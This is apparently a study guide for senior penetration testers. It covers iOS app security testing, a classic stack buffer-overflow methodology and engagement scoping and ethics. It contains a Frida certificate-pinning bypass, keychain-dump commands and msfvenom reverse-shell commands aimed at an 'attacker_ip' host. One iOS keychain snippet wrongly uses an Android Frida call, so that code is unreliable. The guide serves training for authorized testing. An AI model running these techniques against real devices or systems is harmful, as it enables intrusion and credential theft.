# Mobile Security — iOS

!!! info "Why This Matters"
    iOS security testing is expected at senior level. The fundamentals differ significantly from Android — different architecture, different security model, different tooling. OWASP MASTG covers both platforms and is the reference standard for both.

---

## iOS Architecture and Security Model

### Platform Security

**Secure Boot Chain:** Each boot stage verifies the next using Apple's keys. Low-level Boot ROM → iBoot → iOS kernel. Prevents unsigned code from running at the kernel level.

**Code Signing:** All code on iOS must be signed with a certificate from Apple. Prevents arbitrary executable loading. Jailbreaks bypass this. Developers need provisioning profiles for testing.

**App Sandbox:** Each app runs in an isolated container. Cannot directly access other apps' files or system resources without explicit entitlements. Similar concept to Android's UID-based sandbox but enforced by mandatory access control (MAC) via TrustedBSD.

**Data Protection Classes:** Files can be assigned protection classes that determine when they're decryptable:
- `NSFileProtectionComplete` — encrypted when device locked
- `NSFileProtectionCompleteUnlessOpen` — decryptable if file was open when locked
- `NSFileProtectionCompleteUntilFirstUserAuthentication` — protected until first unlock after boot (default)
- `NSFileProtectionNone` — always accessible

**Keychain:** Secure storage for credentials, certificates, and keys. Items can be restricted by device state (requires unlock, biometric, etc.) and by app entitlements.

**Entitlements:** XML plist signed into the app that grants specific capabilities beyond the standard sandbox — network access, push notifications, keychain sharing, iCloud, etc.

---

## IPA Structure

An IPA file is a ZIP archive:
```
App.ipa (ZIP)
├── Payload/
│   └── App.app/
│       ├── App                 ← Main executable (ARM64 Mach-O binary)
│       ├── Info.plist          ← App metadata (bundle ID, version, permissions)
│       ├── embedded.mobileprovision  ← Provisioning profile
│       ├── _CodeSignature/     ← Code signature
│       ├── Frameworks/         ← Bundled frameworks/libraries
│       └── Assets.car          ← Compiled assets
```

---

## Static Analysis on iOS

```bash
# Extract IPA
unzip App.ipa -d App_extracted/

# Examine Info.plist
plutil -p Payload/App.app/Info.plist
# Look for:
# NSAppTransportSecurity → ATS exceptions (cleartext HTTP allowed?)
# NSFaceIDUsageDescription → FaceID usage
# Permissions usage descriptions
# UIFileSharingEnabled → Exposes Documents folder in iTunes
# BackupFiles → Allows backup of sensitive files

# Decrypt the binary (if from App Store — App Store apps are encrypted)
# Requires: jailbroken device + frida-ios-dump or objection
frida-ios-dump -u mobile -H device_ip App

# On a non-jailbroken device: developer builds are not encrypted
# Use decrypted binary for static analysis

# String extraction from binary
strings App | grep -iE "password|token|key|secret|api|http"

# Disassembly / decompilation
# Ghidra (free) or Hopper (commercial) for ARM64 Mach-O
# class-dump for Objective-C class headers:
class-dump App > App_headers.h
grep -i "password\|token\|key\|credential" App_headers.h

# For Swift — use Hopper or a decompiler that handles Swift ABI
```

---

## Dynamic Analysis on iOS

### Setup Requirements

- **Jailbroken device** (Checkra1n, Palera1n, Unc0ver) or
- **Non-jailbroken + Frida gadget** (embed Frida into the IPA and resign)

```bash
# SSH to jailbroken device
ssh mobile@device_ip  # default password: alpine

# Install Frida on device (via Cydia/Sileo)
# Add repo: https://build.frida.re

# Connect frida to device via USB
frida-ps -U                      # List processes
frida -U -f com.example.App -l script.js --no-pause
```

### Objection on iOS

```bash
objection -g com.example.App explore

# Inside objection:
ios info list                   # App info
ios bundles list_bundles        # Loaded bundles
ios plist cat Info.plist        # Read plist
ios keychain dump               # Dump keychain items!
ios pasteboard monitor          # Monitor clipboard
ios hooking list classes        # All ObjC classes
ios hooking list methods com.example.AppDelegate  # Methods in class
ios hooking watch class com.example.AuthManager   # Hook all methods
ios sslpinning disable          # SSL pinning bypass
ios ui dump                     # UI hierarchy
```

### Keychain Extraction

```bash
# Via objection (most convenient)
ios keychain dump

# Via Frida script
Java.perform(function() {
    // iOS keychain access via frida-ios-keychain plugin
});

# Items to look for:
# Session tokens, API keys, certificates, passwords
# Protection class matters: items with kSecAttrAccessibleAlways = accessible when locked
```

---

## Certificate Pinning Bypass on iOS

### Method 1: SSL Kill Switch 2 (Jailbroken)

Install SSL Kill Switch 2 via Cydia/Sileo — globally disables certificate pinning for all apps. Sets a flag that the SSL validation hooks check before enforcing pinning.

### Method 2: Objection

```bash
ios sslpinning disable
# Hooks NSURLSession, AFNetworking, Alamofire, NSURLConnection, TrustKit
```

### Method 3: Frida Script

```javascript
// Universal SSL pinning bypass for iOS
// Source: https://codeshare.frida.re/@machoreverser/ios12-ssl-kill-switch

// Hook SecTrustEvaluate (low-level security framework)
Interceptor.replace(
    Module.findExportByName("Security", "SecTrustEvaluate"),
    new NativeCallback(function(trust, result) {
        // Write SecTrustResultType.kSecTrustResultProceed
        Memory.writeU32(result, 1);
        return 0; // errSecSuccess
    }, 'int', ['pointer', 'pointer'])
);
```

### Method 4: IPA Modification + Resign

For non-jailbroken devices: modify the app bundle to embed a Frida gadget as a dylib, resign with your developer certificate, install via AltStore or Xcode.

---

# Exploit Development Basics

!!! info "Why This Matters"
    Exploit development is expected knowledge at senior level even if you don't write exploits daily. Understanding memory layout and vulnerability mechanics helps you understand CVEs deeply enough to assess patch urgency, adapt public PoCs, and discuss exploit development in interviews with authority.

---

## Memory Layout

```
High addresses (0xFFFFFFFF)
┌─────────────────┐
│     Stack       │  Local variables, function args, return addresses
│  (grows down)   │  LIFO — most recently called function on top
├─────────────────┤
│                 │
│   (free space)  │
│                 │
├─────────────────┤
│     Heap        │  Dynamically allocated memory (malloc, new)
│  (grows up)     │  Manual management — use-after-free, heap overflow
├─────────────────┤
│  BSS segment    │  Uninitialized global/static variables
├─────────────────┤
│  Data segment   │  Initialized global/static variables
├─────────────────┤
│  Text segment   │  Program code (read-only)
│  (Code)         │
└─────────────────┘
Low addresses (0x00000000)
```

### The Stack Frame

When a function is called:
```
┌─────────────────────┐ ← High addresses
│   Function args      │
├─────────────────────┤
│   Return address     │ ← Where execution resumes after function returns
├─────────────────────┤
│   Saved EBP/RBP     │ ← Previous frame pointer saved here
├─────────────────────┤
│   Local variables   │ ← Buffer space allocated here
│   [AAAA...]         │
└─────────────────────┘ ← Stack pointer (ESP/RSP) points here
```

**Buffer overflow:** If a local buffer has fixed size (e.g., 100 bytes) and the program copies user input without length checking, input beyond 100 bytes overwrites adjacent stack memory — including the return address.

---

## Stack-Based Buffer Overflow — Methodology

Classic learning methodology for understanding memory corruption:

### Step 1: Fuzzing — Find the Crash

```python
import socket

# Send increasing lengths until application crashes
for size in range(100, 5000, 100):
    payload = b"A" * size
    s = socket.socket()
    s.connect(('target', 9999))
    s.send(payload)
    s.close()
    print(f"Sent {size} bytes")
```

### Step 2: Find the Exact Offset

```bash
# Create a unique cyclic pattern (Metasploit)
msf-pattern_create -l 2000
# Send the pattern instead of As

# After crash, find value in EIP register
msf-pattern_offset -l 2000 -q 0x39694438
# Returns: exact offset to EIP overwrite

# Alternative: pwndbg/GEF in GDB
cyclic 2000  # Generate pattern
cyclic -l 0x39694438  # Find offset
```

### Step 3: Control EIP

```python
offset = 1978  # From pattern offset
payload = b"A" * offset + b"B" * 4  # B's go into EIP
# If EIP = 0x42424242 (BBBB) — confirmed control
```

### Step 4: Verify ESP and Space

After controlling EIP, ESP points to the bytes after EIP — where shellcode can be placed. Check available space and note bad characters (bytes the application strips/transforms).

### Step 5: Find JMP ESP

Need to redirect EIP to ESP (where shellcode lives). Find a `JMP ESP` instruction in a module without ASLR/DEP:

```bash
# In Immunity Debugger + mona.py
!mona jmp -r esp -cpb "\x00\x0a\x0d"  # Find JMP ESP, exclude bad chars

# In GDB with pwndbg
rop --search "jmp esp"
ROPgadget --binary vulnerable.exe --rop | grep "jmp esp"
```

### Step 6: Generate Shellcode

```bash
# Metasploit shellcode generator
msfvenom -p windows/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 \
  -b "\x00\x0a\x0d" -f python
# -b = bad characters to avoid

msfvenom -p linux/x86/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 \
  -b "\x00" -f python
```

### Final Payload Structure

```
[A * offset] + [JMP ESP address, little-endian] + [NOP sled] + [shellcode]
     ↑                    ↑                              ↑
  Fills buffer       Overwrites EIP               Optional extra
                    (lands on JMP ESP)            safety space
```

---

## Modern Protections (Why Classic BOF is Rarely Exploitable Now)

**ASLR (Address Space Layout Randomization):** Randomizes base addresses of stack, heap, and libraries each run. The JMP ESP address changes every execution. Bypasses: information leaks, brute force (32-bit), partial overwrite.

**DEP/NX (Data Execution Prevention / No-Execute):** Marks memory regions as non-executable. Stack and heap are non-executable — shellcode placed there causes access violation. Bypass: **ROP (Return-Oriented Programming)** — chains of existing code snippets ending in `ret` instructions to perform arbitrary computation without injecting code.

**Stack Canary (Stack Cookie):** Random value placed between local variables and the return address. Checked before function return — if overwritten, process terminates. Bypass: format string vulnerability to leak the canary value.

**CFG/CET (Control Flow Guard / Control Flow Enforcement Technology):** Validates indirect calls and returns against a whitelist. Modern mitigation against ROP.

---

# Engagement Management

!!! info "Why This Matters"
    Technical skill is table stakes at senior level. What differentiates senior pentesters in interviews and on the job is professional judgment — how you manage scope ambiguity, handle client communication during a test, and make decisions that protect both the client and your firm legally and reputationally.

---

## Pre-Engagement: Scoping

Scoping determines what you're testing and under what conditions. Mistakes here ripple through the entire engagement.

### Defining Scope Correctly

```
Too narrow: "Test the website" 
→ Which environment? Production or staging? All subdomains? APIs? Mobile?

Too broad: "Test everything at example.com"
→ Does that include third-party services they use? CDN? Cloud services?
→ Does it include acquisitions under different domains?

Correct: "Test the following production web applications and their APIs:
- https://app.example.com (web + API)
- https://admin.example.com (admin panel)
- Subdomains enumerated during testing are in scope
- Third-party services (Salesforce, Stripe) are NOT in scope
- Production database servers are NOT to be exploited (identify vulns only)"
```

### The Pre-Engagement Checklist

```
□ Signed Statement of Work (SOW)
□ Signed Rules of Engagement (ROE)
□ Signed NDA
□ Authorization letter from appropriate executive (not just IT admin)
□ Emergency contact (24/7 — for critical findings or accidents)
□ Technical contact (for clarifications during test)
□ Testing window defined (dates, hours)
□ Blackout periods defined (critical business events to avoid)
□ Third-party authorization (cloud provider, hosting company if applicable)
□ Credentials for authenticated testing (if applicable)
□ VPN or access method confirmed and tested before engagement start
□ White-list IP addresses at perimeter (for external tests where stealth not required)
```

---

## During Engagement: Critical Decisions

### When to Stop Testing

Stop immediately and escalate to the emergency contact if:
- You discover evidence of an active attacker in the environment (not you)
- You accidentally take down a production service
- You find evidence of serious crimes (CSAM, financial fraud)
- You gain access to systems clearly out of scope
- You discover data that appears to be a current data breach in progress

Document the time and nature of the discovery before making the call.

### The "Nuclear Finding" Call

If you find a critical vulnerability that presents immediate, serious risk (e.g., unauthenticated RCE on the payment server), don't wait until the end of the engagement to notify the client. Call the technical contact immediately.

Why: the client may want to patch immediately and accept residual risk for the remaining test period. They may want to shut the test down. They deserve the ability to make that decision.

How: "I need to notify you of a critical finding before I continue. We've identified unauthenticated remote code execution on [server]. I'd recommend discussing before I proceed further."

### Managing Scope Ambiguity

You access System A, and from it you can reach System B which is not in the scope document. **Stop.** Do not test System B. 

The correct action: document that System B is reachable from System A (this is itself a finding — potentially a segmentation failure or unexpected network path), and notify the client to clarify whether to expand scope.

Never expand scope unilaterally, even if the opportunity is clearly valuable.

---

## Post-Engagement

### Data Retention and Destruction

Establish in the SOW how long you retain engagement data (typically 30-90 days after report delivery). After that period, client data should be securely destroyed.

If you captured actual credentials, PII, or financial data during testing — these must be handled per the data classification agreement, typically: reference in the report (show you accessed it, don't include the actual data), delete securely after client acknowledgment.

### Remediation Verification

Many engagements include a remediation round — the client fixes findings, you verify the fixes. This is a separate engagement activity that should be scoped and authorized separately. Don't assume you can re-test without a new authorization.

### Lessons Learned

After every engagement: what went well, what could improve, what new techniques were encountered, what unusual findings should be shared with the team (sanitized for client confidentiality)?

Senior pentesters document and share institutional knowledge — this is what builds team capability over time.
